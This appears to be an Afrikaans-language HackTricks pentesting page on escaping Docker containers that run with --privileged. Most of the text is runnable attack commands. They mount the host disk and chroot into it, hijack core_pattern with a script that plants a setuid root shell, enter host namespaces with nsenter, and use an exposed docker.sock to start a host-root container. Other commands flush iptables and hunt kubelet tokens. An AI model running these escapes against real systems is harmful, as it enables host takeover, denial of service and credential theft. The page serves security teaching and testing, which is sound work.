# Ontsnap Uit `--privileged`-Houers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n Houer wat met `--privileged` begin word, is nie dieselfde as 'n normale houer met een of twee ekstra toestemmings nie. In die praktyk verwyder of verswak `--privileged` verskeie van die verstek-runtime-beskermings wat die workload normaalweg van gevaarlike gasheerhulpbronne weghou. Die presiese effek hang steeds van die runtime en gasheer af, maar vir Docker is die gewone resultaat:

- alle capabilities word toegestaan
- die device cgroup-beperkings word opgehef
- baie kernel-lêerstelsels word nie meer read-only gemount nie
- verstek-gemaskerde procfs-paaie verdwyn
- seccomp-filtering word gedeaktiveer
- AppArmor-beperking word gedeaktiveer
- SELinux-isolasie word gedeaktiveer of deur 'n veel breër label vervang

Die belangrike gevolg is dat 'n bevoorregte houer gewoonlik **nie** 'n subtiele kernel-exploit nodig het nie. In baie gevalle kan dit eenvoudig met gasheertoestelle, gasheergeoriënteerde kernel-lêerstelsels of runtime-koppelvlakke interaksie hê en dan na 'n gasheer-shell oorskakel.

## Wat `--privileged` Nie Outomaties Verander Nie

`--privileged` voeg jou **nie** outomaties by die gasheer se PID-, netwerk-, IPC- of UTS-namespaces nie. 'n Bevoorregte houer kan steeds private namespaces hê. Dit beteken dat sommige ontsnappingskettings 'n ekstra voorwaarde vereis, soos:

- 'n gasheer-bind mount
- gedeelde gasheer-PID's
- gasheernetwerking
- sigbare gasheertoestelle
- skryfbare proc/sys-koppelvlakke

Daardie toestande is dikwels maklik om in werklike wanconfigurasies te verkry, maar hulle is konseptueel apart van `--privileged` self.

## Ontsnappingspaaie

### 1. Mount Die Gasheerskyf Deur Blootgestelde Toestelle

'n Bevoorregte houer sien gewoonlik baie meer toestelnodes onder `/dev`. As die gasheer se bloktoestel sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` na die gasheerlêerstelsel oor te skakel:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
As die root-partisie nie duidelik is nie, enumereer eers die blok-uitleg:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
As die praktiese benadering is om eerder ’n setuid-helper in ’n skryfbare host-mount te plaas as om te `chroot`, onthou dat nie elke filesystem die setuid-bit respekteer nie. ’n Vinnige capability-check aan die host-kant is:
```bash
mount | grep -v "nosuid"
```
Dit is nuttig omdat skryfbare paaie onder `nosuid`-lêerstelsels baie minder interessant is vir klassieke workflows van "drop 'n setuid-shell en voer dit later uit".

Die verswakte beskermings wat hier misbruik word, is:

- volledige blootstelling aan toestelle
- breë capabilities, veral `CAP_SYS_ADMIN`

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Monteer of Hergebruik 'n Host Bind Mount en `chroot`

As die host se wortellêerstelsel reeds binne die container gemonteer is, of as die container die nodige mounts kan skep omdat dit privileged is, is 'n host-shell dikwels net een `chroot` weg:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Hierdie pad misbruik:

- verswakte mount-beperkings
- volledige capabilities
- gebrek aan MAC-isolasie

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Misbruik skryfbare `/proc/sys` Of `/sys`

Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskerming baie swakker word. Dit kan kernel-koppelvlakke wat op die host gerig is, blootstel wat normaalweg gemasker of read-only gemount is.

’n Klassieke voorbeeld is `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ander paaie met hoë waarde sluit in:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Hierdie metode buit die volgende uit:

- ontbrekende gemaskerde paths
- ontbrekende leesalleen-stelselpaths

Verwante bladsye:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Gebruik Volledige Capabilities Vir Mount- Of Namespace-Gebaseerde Escape

’n Bevoorregte container kry die capabilities wat normaalweg uit standaardcontainers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` en baie ander. Dit is dikwels genoeg om ’n plaaslike foothold in ’n host-escape te verander sodra daar ’n ander blootgestelde oppervlak bestaan.

’n Eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace-entry te gebruik:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
As die host PID ook gedeel word, word die stap selfs korter:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Hierdie pad misbruik:

- die verstek privileged capability-stel
- opsionele host-PID-deling

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

'n Bevoorregte container eindig dikwels met host runtime-toestand of -sockets wat sigbaar is. Indien 'n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om 'n tweede container met host-toegang te begin:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Vir containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Hierdie pad misbruik:

- blootstelling aan bevoorregte runtime
- host-bind mounts wat deur die runtime self geskep is

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Verwyder Neweffekte van Network Isolation

`--privileged` sluit nie op sigself by die host network namespace aan nie, maar as die container ook `--network=host` of ander host-network-toegang het, word die volledige network stack veranderbaar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit is nie altyd ’n direkte host shell nie, maar dit kan denial of service, verkeersonderskepping of toegang tot loopback-only management services veroorsaak.

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lees Host Secrets en Runtime State

Selfs wanneer ’n skoon shell escape nie onmiddellik moontlik is nie, het privileged containers dikwels genoeg toegang om host secrets, kubelet-state, runtime metadata en die lêerstelsels van naburige containers te lees:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
As `/var` op die host gemount is of die runtime-gidse sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroles

Die doel van die volgende opdragte is om te bevestig watter bevoorregte-container escape families onmiddellik haalbaar is.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Wat hier interessant is:

- ’n volledige capability-stel, veral `CAP_SYS_ADMIN`
- skryfbare proc/sys-blootstelling
- sigbare host-toestelle
- ontbrekende seccomp- en MAC-beperking
- runtime-sokke of bind mounts van die host se root

Enige een hiervan kan genoeg wees vir post-exploitation. Verskeie saam beteken gewoonlik dat die container funksioneel net een of twee commands van host-kompromittering af is.

## Verwante bladsye

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Verwysings

- [1] [Ontsnap uit privileged containers vir pret](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
